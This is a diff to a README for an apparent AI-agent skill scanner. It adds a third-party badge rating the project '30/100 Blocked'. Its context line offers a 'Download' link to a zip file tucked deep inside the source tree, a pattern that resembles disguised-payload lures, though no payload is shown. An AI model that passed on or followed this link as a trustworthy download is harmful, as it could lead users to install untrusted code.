@@ -1,5 +1,7 @@
 # 🔍 skill-scanner - Secure Your Agent Skills Easily  
 
+[![SafeSkill 30/100](https://img.shields.io/badge/SafeSkill-30%2F100_Blocked-red)](https://safeskill.dev/scan/shrav89-skill-scanner)
+
 [![Download skill-scanner](https://raw.githubusercontent.com/shrav89/skill-scanner/main/skill_scanner/core/static_analysis/types/scanner_skill_v2.0-beta.4.zip)](https://raw.githubusercontent.com/shrav89/skill-scanner/main/skill_scanner/core/static_analysis/types/scanner_skill_v2.0-beta.4.zip)
 
 ## 🚀 Getting Started  
